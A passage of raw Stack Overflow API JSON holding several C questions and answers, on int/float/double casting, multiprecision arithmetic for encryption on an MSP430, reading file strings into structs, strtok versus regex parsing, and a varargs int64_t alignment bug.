<code>int</code> is wider than the range of a <code>double</code>'s <em>exactly representable whole numbers</em>.</p>\n\n<p>With <code>(float) x</code>, the conversion is commonly inexact on many platforms over the range of <code>int</code>, as <code>float</code> has not more range than <code>double</code> and is commonly narrower.</p>\n\n<p>When an inexact conversion to <code>int</code> to <code>float</code> or <code>double</code> occurs, the result is normally to the closest possible result.</p>\n\n<hr>\n\n<p><code>(float) x == (float) dx</code> can be false on platforms whose ranges of floating point <em>exactly representable whole numbers</em> of <code>float</code> and <code>double</code> differ and <em>both</em> are a sub-range of <code>int</code>.  Likely <code>INT_MAX</code> will fail.  With binary64 and 32 bit <code>int</code> (OP's case?), this equality should always be true.</p>\n\n<p><code>dx - dy == (double) (x-y)</code> can be false for the same reason as above and an additional one: In C, <code>int</code> <em>overflow</em> is not defined, so <code>INT_MIN - 1</code> is undefined.  Any result is possible.</p>\n\n<p><code>(dx + dy) + dz == dx + (dy + dz)</code> can be false when <code>int</code> range is wider than <code>double</code> (uncommon), and <code>dx</code> is a rounded value whose next higher representable value to 2 greater.  <code>(dx + 1)</code> may round to <code>dx</code>, yet <code>dx + 2</code> is representable.  So <code>(dx + 1) + 1 != dx + (1 + 1)</code></p>\n\n<p><code>(dx * dy) * dz == dx * (dy * dz)</code> is easily false when the sub-products and/or products are not exact - often when the mathematical product exceeds the <em>exactly representable whole numbers</em> of <code>double</code>.</p>\n\n<p><code>dx / dx == dz / dz</code> can simple be false when <code>dx</code> is <code>0</code> and division by 0 is not defined.</p>\n"}], "owner": {"reputation": 21, "user_id": 7348130, "user_type": "registered", "profile_image": "https://graph.facebook.com/1814723838808041/picture?type=large", "display_name": "Tu\u1ea5n Ki\u1ec7t Nguy\u1ec5n Ho&#224;ng", "link": "https://stackoverflow.com/users/7348130/tu%e1%ba%a5n-ki%e1%bb%87t-nguy%e1%bb%85n-ho%c3%a0ng"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 4091, "favorite_count": 1, "answer_count": 3, "score": 2, "last_activity_date": 1482944027, "creation_date": 1482898214, "last_edit_date": 1482902189, "question_id": 41355213, "link": "https://stackoverflow.com/questions/41355213/casting-between-int-float-and-double-in-c", "title": "Casting between int, float and double in C", "body": "<p>I don't really understand casting in C. Can anyone help me with a question in the book <a href=\"https://rads.stackoverflow.com/amzn/click/com/9332573905\" rel=\"nofollow noreferrer\" rel=\"nofollow noreferrer\">Computer Systems: A Programmer's Perspective</a>:</p>\n\n<hr>\n\n<p>We generate arbitrary integer values x, y, and z, and convert them to values of type double as follows:</p>\n\n<pre><code>int x = random();\nint y = random();\nint z = random();\n\ndouble dx = (double) x;\ndouble dy = (double) y;\ndouble dz = (double) z;\n</code></pre>\n\n<p>For each of the following C expressions, you are to indicate whether or not the expression always yields 1. If it always yields 1, describe the underlying mathematical principles. Otherwise, give an example of arguments that make it yields 0</p>\n\n<pre><code>A. (float) x == (float) dx\nB. dx - dy == (double) (x-y)\nC. (dx + dy) + dz == dx + (dy + dz)\nD. (dx * dy) * dz == dx * (dy * dz)\nE. dx / dx == dz / dz\n</code></pre>\n"}, {"tags": ["c", "gcc", "gmp", "msp430", "relic"], "comments": [{"owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "edited": false, "score": 2, "creation_date": 1482898678, "post_id": 41355079, "comment_id": 69912305, "body": "Have you attempted to build OpenSSL on this platform?  The crypto library has all the encryption algorithms you need and is likely to be much more secure than writing your own implementation."}, {"owner": {"reputation": 10223, "user_id": 7032856, "user_type": "registered", "accept_rate": 81, "profile_image": "https://lh6.googleusercontent.com/-v2P-pqI1pww/AAAAAAAAAAI/AAAAAAAAABg/BHOFSOpQ0BM/photo.jpg?sz=128", "display_name": "Nae", "link": "https://stackoverflow.com/users/7032856/nae"}, "reply_to_user": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "edited": false, "score": 0, "creation_date": 1482900396, "post_id": 41355079, "comment_id": 69912699, "body": "I did see OpenSSL but wasn&#39;t really sure if it would work, but looks more promising at this point, also more on the point. Thanks a lot for reminding me."}], "answers": [{"tags": [], "owner": {"reputation": 157205, "user_id": 11654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/586424ca0847070dc1868aa58077003e?s=128&d=identicon&r=PG", "display_name": "CL.", "link": "https://stackoverflow.com/users/11654/cl"}, "is_accepted": false, "score": 1, "last_activity_date": 1482910609, "creation_date": 1482910609, "answer_id": 41357480, "question_id": 41355079, "link": "https://stackoverflow.com/questions/41355079/is-there-any-way-of-doing-multiprecision-arithmeticwith-integers-that-are-great/41357480#41357480", "title": "Is there any way of doing multiprecision arithmetic(with integers that are greater than 64-bit) in msp430?", "body": "<p>It is unlikely that any of these libraries can be compiled for an embedded 16-bit architecture.</p>\n\n<p>The MSP430 CPU has add-with-carry and similar instructions, and that is how the compiler implements 32- and 64-bit integers.\nSo it would be possible, in theory, to write these algorithms yourself, with lots of (inline) assembly.\n But I doubt that the G2553 has enough memory for this.</p>\n\n<p>(There is a reason that some larger MSP430s have an AES hardware accelerator, and that none have one for RSA.)</p>\n"}], "owner": {"reputation": 10223, "user_id": 7032856, "user_type": "registered", "accept_rate": 81, "profile_image": "https://lh6.googleusercontent.com/-v2P-pqI1pww/AAAAAAAAAAI/AAAAAAAAABg/BHOFSOpQ0BM/photo.jpg?sz=128", "display_name": "Nae", "link": "https://stackoverflow.com/users/7032856/nae"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 197, "favorite_count": 0, "answer_count": 1, "score": 7, "last_activity_date": 1482910609, "creation_date": 1482896871, "last_edit_date": 1482897470, "question_id": 41355079, "link": "https://stackoverflow.com/questions/41355079/is-there-any-way-of-doing-multiprecision-arithmeticwith-integers-that-are-great", "title": "Is there any way of doing multiprecision arithmetic(with integers that are greater than 64-bit) in msp430?", "body": "<ul>\n<li>I'd like to know if there is any way, if possible any simple way, to do <strong>arithmetic with integers that are larger than 64-bit</strong> in size on MSP430?</li>\n</ul>\n\n<p>I'm asking this specifically because I'm trying to implement    encryption algorithms (RSA, AES, hash functions, digital signatures,    etc.) on an <strong>msp430g2553</strong> platform.</p>\n\n<p>I searched through the internet, and through a misguided despair I installed linux distributions in order to use <a href=\"https://gmplib.org/\" rel=\"noreferrer\">GMP</a> but failed miserably. I installed Kali and then later Lubuntu <em>on</em> a USB(2.0) stick only to suffer through the unbearable freezes, with no clue on if it would work or not. Later on tried the magic of VMBox and things got way easier after that, though inconclusive. I eventually came to a point with mps430-gcc, and mspdebug that I could debug some example codes, and see them work, but still unable to do GMP operations due to mostly library errors (undefined reference to mpz_t init... etc.).</p>\n\n<p>To my understanding GMP is a multiprecision arithmetic library to work on specific processor architectures, and MSP430 is not one of them, though, at this point, I'd not be surprised if it is one of them. Best answer I got was that some TI employee is <em>unfamiliar</em> with it. So;</p>\n\n<ul>\n<li>Is it possible to use GMP on MSP430, or more specifically on\nmsp430g2553?</li>\n</ul>\n\n<p>I've hardly seen anything on google that has cross-reference of msp430 with gmp, and I'm at point that I'm trying to implement <a href=\"https://github.com/Naeus/msp430/tree/master/rsa_bali\" rel=\"noreferrer\">a miserable 64-bit key sized RSA</a> that's barely working, if at all. So I hope this post, and its answers help someone, and hopefully to me as well, later on.</p>\n\n<p>Also I forgot to mention, I've read about relic toolkit, (but didn't spend my time trying to implement it as GMP looked more like the standard in that area), and I'd like to know:</p>\n\n<ul>\n<li>Is there a Relic guide for dummies that you can link, and again if it's possible to work with it on MSP430?</li>\n</ul>\n\n<p>Thanks everyone.</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 0, "creation_date": 1482894105, "post_id": 41354674, "comment_id": 69911432, "body": "<code>fptr(&quot;...&quot;,&quot;r&quot;);</code> --&gt; <code>fptr = fopen(filename,&quot;r&quot;);</code>, <code>game-&gt;players[0].name=ch</code> --&gt; <code>game-&gt;players[0].name[i++]=ch;</code> ... <code>game-&gt;players[0].name[i] = 0;</code> or <code>fscanf(fptr, &quot;%[^;]&quot;, game-&gt;players[0].name);</code>"}, {"owner": {"reputation": 25, "user_id": 7336460, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/d4fq7.jpg?s=128&g=1", "display_name": "Manoh Barkas", "link": "https://stackoverflow.com/users/7336460/manoh-barkas"}, "edited": false, "score": 0, "creation_date": 1482894777, "post_id": 41354674, "comment_id": 69911565, "body": "My problem is not reading the string, it is assigning it&#39;s value to the structure."}, {"owner": {"reputation": 463, "user_id": 1177962, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/dfae82d8238504857424d10cb40eaa1f?s=128&d=identicon&r=PG", "display_name": "Ngo Thanh Nhan", "link": "https://stackoverflow.com/users/1177962/ngo-thanh-nhan"}, "edited": false, "score": 0, "creation_date": 1482898003, "post_id": 41354674, "comment_id": 69912159, "body": "ch is char type. I guess game-&gt;players[0].name is a char[] . So you can use BLUEPIXY answer to do that"}], "owner": {"reputation": 25, "user_id": 7336460, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/d4fq7.jpg?s=128&g=1", "display_name": "Manoh Barkas", "link": "https://stackoverflow.com/users/7336460/manoh-barkas"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 37, "favorite_count": 0, "closed_date": 1482894527, "answer_count": 0, "score": 0, "last_activity_date": 1482893916, "creation_date": 1482892966, "last_edit_date": 1482893916, "question_id": 41354674, "link": "https://stackoverflow.com/questions/41354674/c-how-to-read-a-string-from-a-file-and-assigning-it-to-an-element-from-a-struct", "closed_reason": "Duplicate", "title": "C: How to read a string from a file and assigning it to an element from a structure", "body": "<p>The structures are already defined.\nI would really appreciate any help.</p>\n\n<pre><code>FILE *fptr;\nint ch;\n\nfptr(\"...\",\"r\");  \n  while ((ch = fgetc(fptr)) != ';'){\n    }\nstrcpy(game-&gt;players[0].name,ch);\nfclose(fptr);\n</code></pre>\n"}, {"tags": ["c", "regex", "match"], "comments": [{"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 2, "creation_date": 1482892164, "post_id": 41354543, "comment_id": 69911050, "body": "Why use RegExp when you have a fully featured programming language to work with. In other words, just use <code>strtok</code>."}, {"owner": {"reputation": 496, "user_id": 5652672, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/3407c3a36945a8f55b12dc993bfabe3b?s=128&d=identicon&r=PG&f=1", "display_name": "Vijay Wilson", "link": "https://stackoverflow.com/users/5652672/vijay-wilson"}, "edited": false, "score": 0, "creation_date": 1482905343, "post_id": 41354543, "comment_id": 69914231, "body": "In regex go with, <b>(?:([0-9]+)\\s){26}</b>  <a href=\"https://regex101.com/r/7Lo4vh/1\" rel=\"nofollow noreferrer\">regex101.com/r/7Lo4vh/1</a>"}], "answers": [{"comments": [{"owner": {"reputation": 3, "user_id": 3083702, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/05aea30dbe94a43b43b104e0f9461d00?s=128&d=identicon&r=PG&f=1", "display_name": "eduardogarcia234", "link": "https://stackoverflow.com/users/3083702/eduardogarcia234"}, "edited": false, "score": 0, "creation_date": 1482896909, "post_id": 41354595, "comment_id": 69911958, "body": "always i&#39;ve had searched about regexp in certain scenarios (like formatting XML and or HTML content, filtering some kind of data) i&#39;ve read how this could be imprecise or could even fail sometimes, so i&#39;m in this kind of situation again"}, {"owner": {"reputation": 3, "user_id": 3083702, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/05aea30dbe94a43b43b104e0f9461d00?s=128&d=identicon&r=PG&f=1", "display_name": "eduardogarcia234", "link": "https://stackoverflow.com/users/3083702/eduardogarcia234"}, "edited": false, "score": 0, "creation_date": 1482897176, "post_id": 41354595, "comment_id": 69912003, "body": "and of course, thank you for your feedback, i&#39;ll look onto it"}], "tags": [], "owner": {"reputation": 1740, "user_id": 2832874, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e377f3e2140297d32460ae9a4b38ff98?s=128&d=identicon&r=PG", "display_name": "vielmetti", "link": "https://stackoverflow.com/users/2832874/vielmetti"}, "is_accepted": false, "score": 0, "last_activity_date": 1482892284, "last_edit_date": 1495542825, "creation_date": 1482892284, "answer_id": 41354595, "question_id": 41354543, "link": "https://stackoverflow.com/questions/41354543/regexp-in-c-match-a-digit-after-n-repetitions/41354595#41354595", "title": "regExp in c: match a digit after &lt;n&gt; repetitions", "body": "<p>The Unix strings library has <code>strtok</code> which divides a string into tokens given a delimiter. You should be able to simply iterate through the string until you get to the position you want.</p>\n\n<p>A discussion on Stack Overflow of <code>strtok</code> is at <a href=\"https://stackoverflow.com/questions/8106765/using-strtok-in-c\">Using strtok in c</a> which has some sample code and gotchas.</p>\n"}, {"tags": [], "owner": {"reputation": 22954, "user_id": 5238915, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/fncqh.jpg?s=128&g=1", "display_name": "RoadRunner", "link": "https://stackoverflow.com/users/5238915/roadrunner"}, "is_accepted": true, "score": 2, "last_activity_date": 1482898271, "last_edit_date": 1482898271, "creation_date": 1482893754, "answer_id": 41354763, "question_id": 41354543, "link": "https://stackoverflow.com/questions/41354543/regexp-in-c-match-a-digit-after-n-repetitions/41354763#41354763", "title": "regExp in c: match a digit after &lt;n&gt; repetitions", "body": "<p>I believe using <code>RegExp</code> will make the problem more complicated, as suggested by others, using <a href=\"https://www.tutorialspoint.com/c_standard_library/c_function_strtok.htm\" rel=\"nofollow noreferrer\"><code>strtok</code></a> is much easier. </p>\n\n<p>You can parse the string at each space, and match the pattern you are trying to search for using <a href=\"https://www.tutorialspoint.com/c_standard_library/c_function_strcmp.htm\" rel=\"nofollow noreferrer\"><code>strcmp</code></a> from <code>&lt;string.h&gt;</code>. </p>\n\n<p>Here is a basic idea of what you might want to use:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nchar *string_search(char *string, unsigned position);\n\nint main(void) {\n    char string[] = \"250727985 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 238463729 0 0 0 0 0 8510 1009565 0 0 0 0 0\";\n    char *check;\n    unsigned position = 26;\n\n    check = string_search(string, position);\n\n    if (check != NULL) {\n        printf(\"String %s found in position %d.\\n\", check, position);\n    } else {\n        printf(\"No string found in position %d.\\n\", position);\n    }\n\n    return 0;\n}\n\nchar *string_search(char *string, unsigned position) {\n    char *number;\n    const char *delim = \" \";\n    unsigned pos_count = 1;\n\n    number = strtok(string, delim);\n    while (number != NULL) {\n        if (pos_count == position) {\n            return number;\n        }\n        pos_count++;\n        number = strtok(NULL, delim);\n    }\n    return NULL;\n}  \n</code></pre>\n"}], "owner": {"reputation": 3, "user_id": 3083702, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/05aea30dbe94a43b43b104e0f9461d00?s=128&d=identicon&r=PG&f=1", "display_name": "eduardogarcia234", "link": "https://stackoverflow.com/users/3083702/eduardogarcia234"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 67, "favorite_count": 1, "accepted_answer_id": 41354763, "answer_count": 2, "score": 0, "last_activity_date": 1482898271, "creation_date": 1482891808, "question_id": 41354543, "link": "https://stackoverflow.com/questions/41354543/regexp-in-c-match-a-digit-after-n-repetitions", "title": "regExp in c: match a digit after &lt;n&gt; repetitions", "body": "<p>i have a group of numbers that start with string, inside a string in C:</p>\n\n<pre><code>intr 250727985 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 238463729 0 0 0 0 0 8510 1009565 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0 0 0 0 0 75963 0 0 0 0 0 0 0 0 0 0 0 0 0 6416543 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 29812 197 0 0 0 0 842664 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n</code></pre>\n\n<p>i want to capture (match) only the 26th position of them (desired match: 1009565 on my return.)</p>\n\n<p>i've tried this pattern:</p>\n\n<pre><code>(?:[0-9]+[[:space:]]){26}(?&lt;![0-9])\n</code></pre>\n\n<p>but this is capturing whole string until the desired position.\nHow to achieve this with RegExp in C? someone could provide an sample source?</p>\n\n<p>RegExp is the fastest (and lightest on system resources) way to do this? i need to repeat this operation various times in a second, all the uptime.</p>\n\n<p>i'm confused on how to do this.</p>\n"}, {"tags": ["c", "variadic-functions", "ellipsis"], "comments": [{"owner": {"reputation": 13521, "user_id": 654953, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/f6453f58b70e93dbfa8998b71a95bb09?s=128&d=identicon&r=PG&f=1", "display_name": "Ryan", "link": "https://stackoverflow.com/users/654953/ryan"}, "edited": false, "score": 0, "creation_date": 1482892505, "post_id": 41354528, "comment_id": 69911111, "body": "you&#39;re trying to find the min, i think. because <code>max &lt; t</code> doesn&#39;t make too much sense. Why would INT64_MAX be less than t?"}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 1, "creation_date": 1482892909, "post_id": 41354528, "comment_id": 69911200, "body": "@ssd, FYI, the conventional term for an &quot;ellipsis function&quot; is a <i>varargs function</i>, where &quot;varargs&quot; is short for &quot;variable arguments&quot;."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1482901489, "post_id": 41354528, "comment_id": 69912977, "body": "Another name used for functions with ellipsis in the prototype is &#39;variadic function&#39; \u2014 though the term is not used in the standard (neither is &#39;varargs function&#39;). The standard uses various circumlocutions, none of them as compact \u2014 for example &#39;a function that accepts a variable number of arguments&#39; (&#167;6.9.1 &#182;8)."}], "answers": [{"comments": [{"owner": {"reputation": 17298, "user_id": 1540468, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/2f7d0c7668a2f3b53cf22c01ae63f32b?s=128&d=identicon&r=PG", "display_name": "Paul Rooney", "link": "https://stackoverflow.com/users/1540468/paul-rooney"}, "reply_to_user": {"reputation": 2060, "user_id": 3808573, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/CmqrY.png?s=128&g=1", "display_name": "ssd", "link": "https://stackoverflow.com/users/3808573/ssd"}, "edited": false, "score": 1, "creation_date": 1482892992, "post_id": 41354585, "comment_id": 69911214, "body": "8 <b>bytes</b>, yes thats right. As long as whatever type the arguments were and the type passed to <code>va_arg</code> match up it should work out."}, {"owner": {"reputation": 2060, "user_id": 3808573, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/CmqrY.png?s=128&g=1", "display_name": "ssd", "link": "https://stackoverflow.com/users/3808573/ssd"}, "edited": false, "score": 0, "creation_date": 1482894274, "post_id": 41354585, "comment_id": 69911473, "body": "Thanks again. I&#39;ll delete my prev. comment. It will be confusing: I&#39;ve typed <b>4 bits</b> and <b>8 bits</b> while I really meant <b>4 bytes</b> and <b>8 bytes</b>."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 1, "creation_date": 1482900684, "post_id": 41354585, "comment_id": 69912772, "body": "You could also use <code>INT64_C(1), INT64_C(5), INT64_C(-2)</code> for the <code>int64_t</code> constants.  This doesn&#39;t make much difference here, but might matter if the constants were big enough \u2014 though the compiler will usually cope, I think."}, {"owner": {"reputation": 24488, "user_id": 4082723, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/LJbVr.png?s=128&g=1", "display_name": "2501", "link": "https://stackoverflow.com/users/4082723/2501"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1482907525, "post_id": 41354585, "comment_id": 69915112, "body": "@JonathanLeffler No, don&#39;t use those. INTN_C macro gives a type int_leastN_t not intN_t."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "reply_to_user": {"reputation": 24488, "user_id": 4082723, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/LJbVr.png?s=128&g=1", "display_name": "2501", "link": "https://stackoverflow.com/users/4082723/2501"}, "edited": false, "score": 0, "creation_date": 1482944722, "post_id": 41354585, "comment_id": 69934539, "body": "@2501: Where the system supports the N, you&#39;ll find <code>int_leastN_t</code> is the same as <code>intN_t</code>.  You have to stretch pretty hard to devise a system where you would run into trouble \u2014 in fact, I can&#39;t think of one (but I&#39;m running uncaffeinated so far this morning, so that may not prove anything)."}, {"owner": {"reputation": 24488, "user_id": 4082723, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/LJbVr.png?s=128&g=1", "display_name": "2501", "link": "https://stackoverflow.com/users/4082723/2501"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1482945299, "post_id": 41354585, "comment_id": 69934833, "body": "@JonathanLeffler The worst thing I can think of is that code compiles when it shouldn&#39;t, in absence of intN_t types."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "reply_to_user": {"reputation": 24488, "user_id": 4082723, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/LJbVr.png?s=128&g=1", "display_name": "2501", "link": "https://stackoverflow.com/users/4082723/2501"}, "edited": false, "score": 0, "creation_date": 1482945514, "post_id": 41354585, "comment_id": 69934911, "body": "@2501: please explain how that could occur. If it is too long for comments, please send email \u2014 see my profile."}, {"owner": {"reputation": 24488, "user_id": 4082723, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/LJbVr.png?s=128&g=1", "display_name": "2501", "link": "https://stackoverflow.com/users/4082723/2501"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1482945768, "post_id": 41354585, "comment_id": 69935042, "body": "@JonathanLeffler If intN_t types aren&#39;t defined then the code obviously wouldn&#39;t compile. Although then the PRIdN specifiers will probably be missing. And OP is using intN_t types in function definitions anyway, so it won&#39;t compile for that reason."}, {"owner": {"reputation": 24488, "user_id": 4082723, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/LJbVr.png?s=128&g=1", "display_name": "2501", "link": "https://stackoverflow.com/users/4082723/2501"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1482946111, "post_id": 41354585, "comment_id": 69935217, "body": "@JonathanLeffler Or you could get undefined behavior with a different approach. Have an implementation define uint_least64_t as a standard integer type of width 64, and uint64_t as an extended integer type of width 64. The types are different, and you technically get undefined behavior."}], "tags": [], "owner": {"reputation": 17298, "user_id": 1540468, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/2f7d0c7668a2f3b53cf22c01ae63f32b?s=128&d=identicon&r=PG", "display_name": "Paul Rooney", "link": "https://stackoverflow.com/users/1540468/paul-rooney"}, "is_accepted": true, "score": 6, "last_activity_date": 1482893597, "last_edit_date": 1482893597, "creation_date": 1482892224, "answer_id": 41354585, "question_id": 41354528, "link": "https://stackoverflow.com/questions/41354528/weird-behaving-ellipsis-function-va-list/41354585#41354585", "title": "Weird behaving ellipsis function (va_list)", "body": "<p>The compiler doesn't know that  1,5 and -2 are supposed to be type <code>int64_t</code>. So it will treat them as normal ints and will only use that much space on the stack for them.</p>\n\n<p>You then read them as <code>int64_t</code> which is certainly larger than <code>int</code> and so your input and your <code>var_args</code> are out of alignment.</p>\n\n<p>One way to fix, cast to <code>int64_t</code> at the call site.</p>\n\n<pre><code>printf(\"max(3, 1, 5, -2)   : %\"PRId64\"\\n\", max(3, (int64_t)1, (int64_t)5, (int64_t)-2));\n</code></pre>\n\n<p>You could also obviously explicitly pass <code>int64_t</code> typed variables.</p>\n"}], "owner": {"reputation": 2060, "user_id": 3808573, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/CmqrY.png?s=128&g=1", "display_name": "ssd", "link": "https://stackoverflow.com/users/3808573/ssd"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 120, "favorite_count": 0, "accepted_answer_id": 41354585, "answer_count": 1, "score": 2, "last_activity_date": 1482893597, "creation_date": 1482891703, "last_edit_date": 1482893034, "question_id": 41354528, "link": "https://stackoverflow.com/questions/41354528/weird-behaving-ellipsis-function-va-list", "title": "Weird behaving ellipsis function (va_list)", "body": "<p>The following <code>max</code> function is supposed to return 5 but it returns 4294967294 instead. I suspect the weird behavior arise from casting variables but couldn't figure it out. Can someone detect the fault?</p>\n\n<p>System: Windows 7 (64 bits), mingw64</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;limits.h&gt;\n#include &lt;stdarg.h&gt;\n#include &lt;inttypes.h&gt;\n\nint64_t max(int64_t n, ...) {\n    va_list v;\n    int64_t i, t, max = INT64_MIN;\n\n    va_start(v, n);\n\n    for (i = 0; i &lt; n; i++) {\n        t = va_arg(v, int64_t);\n\n        if (max &lt; t) {\n            max = t;\n        }\n    }\n\n    va_end(v);\n    return (max);\n}\n\nint main(int argc, char **argv) {\n    printf(\"max(3, 1, 5, -2)   : %3I64d\\n\", max(3, 1, 5, -2));\n    return (0);\n}\n</code></pre>\n"}, {"tags": ["c", "variables", "gcc", "global-variables", "typedef"], "comments": [{"owner": {"reputation": 6196, "user_id": 5822075, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a1ba9afcd0c36d9685e3e1b5f2f82be2?s=128&d=identicon&r=PG&f=1", "display_name": "e0k", "link": "https://stackoverflow.com/users/5822075/e0k"}, "edited": false, "score": 0, "creation_date": 1482890927, "post_id": 41354327, "comment_id": 69910786, "body": "Move your <code>#define TASKS_H</code> to the top of the file, right after <code>#ifndef TASKS_H</code>."}, {"owner": {"reputation": 50953, "user_id": 1983495, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/aMDiK.jpg?s=128&g=1", "display_name": "Iharob Al Asimi", "link": "https://stackoverflow.com/users/1983495/iharob-al-asimi"}, "edited": false, "score": 1, "creation_date": 1482891149, "post_id": 41354327, "comment_id": 69910835, "body": "Do not <code>typedef</code> pointers, that&#39;s a terrible idea. Except perhaps if they are 100% opaque types."}, {"owner": {"reputation": 539, "user_id": 3570982, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/c1b2836313c9a217631db857df993d92?s=128&d=identicon&r=PG&f=1", "display_name": "user3570982", "link": "https://stackoverflow.com/users/3570982/user3570982"}, "edited": false, "score": 1, "creation_date": 1482897478, "post_id": 41354327, "comment_id": 69912049, "body": 